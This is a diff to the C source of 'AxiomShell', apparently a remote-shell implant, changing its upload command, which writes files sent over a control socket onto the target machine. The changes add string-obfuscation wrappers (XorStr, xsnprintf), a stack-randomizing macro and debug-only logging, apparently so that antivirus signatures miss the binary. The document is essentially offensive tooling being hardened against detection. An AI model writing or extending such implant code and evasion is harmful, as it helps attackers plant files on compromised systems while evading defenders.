@@ -1,10 +1,12 @@
 #include "AxiomShell.h"
+#include "autoxor.h"
 #include <winnt.h>
 #include <stdio.h>
 #include <errno.h>
 
 BOOL BUILTIN_upload(SOCKET sock, size_t argc, char **argv)
 {
+	STACK_RANDOMIZER;
 	SIZE_T filesize;
 	HANDLE hFile;
 	CHAR buffer[4096];
@@ -14,7 +16,7 @@ BOOL BUILTIN_upload(SOCKET sock, size_t argc, char **argv)
 
 	if (argc !=2)
 	{
-		JSON_send_packets(JsonCommandOutput, sock, (void *)"[!] Usage: upload {LOCAL_FILEPATH} {REMOTE_SAVEPATH}\n");
+		JSON_send_packets(JsonCommandOutput, sock, (void *)XorStr("[!] Usage: upload {LOCAL_FILEPATH} {REMOTE_SAVEPATH}\n"));
 		return (FALSE);
 	}
 
@@ -40,13 +42,13 @@ BOOL BUILTIN_upload(SOCKET sock, size_t argc, char **argv)
 		switch (errno)
 		{
 			case ENOENT:
-				JSON_send_packets(JsonCommandOutput, sock, (void*)"[!] No such file or directory\n");
+				JSON_send_packets(JsonCommandOutput, sock, (void*)XorStr("[!] No such file or directory\n"));
 				break;
 			case EACCES:
-				JSON_send_packets(JsonCommandOutput, sock, (void*)"[!] Permission denied\n");
+				JSON_send_packets(JsonCommandOutput, sock, (void*)XorStr("[!] Permission denied\n"));
 				break;
 			default:
-				snprintf(buffer, sizeof(buffer), "[!] Unexpected error opening file for writing (%ld)\n", GetLastError());
+				xsnprintf(buffer, sizeof(buffer), "[!] Unexpected error opening file for writing (%ld)\n", GetLastError());
 				JSON_send_packets(JsonCommandOutput, sock, (void*)buffer);
 				break;
 		}
@@ -55,7 +57,7 @@ BOOL BUILTIN_upload(SOCKET sock, size_t argc, char **argv)
 
 	// Now write the file, chunk-by-chunk
 	receivedlen = 0;
-	printf("[+] File to receive is %lld bytes long\n", filesize);
+	DEBUG_LOG("[+] File to receive is %lld bytes long\n", filesize);
 	while (1)
 	{
 		memset(buffer, 0, sizeof(buffer));
@@ -73,7 +75,7 @@ BOOL BUILTIN_upload(SOCKET sock, size_t argc, char **argv)
 	}
 
 	// Send status notififcation
-	snprintf(buffer, sizeof(buffer), "[+] File uploaded ! (%lld bytes written)\n", receivedlen);
+	xsnprintf(buffer, sizeof(buffer), "[+] File uploaded ! (%lld bytes written)\n", receivedlen);
 	JSON_send_packets(JsonCommandOutput, sock, buffer);
 	memset(buffer, 0, sizeof(buffer));
 
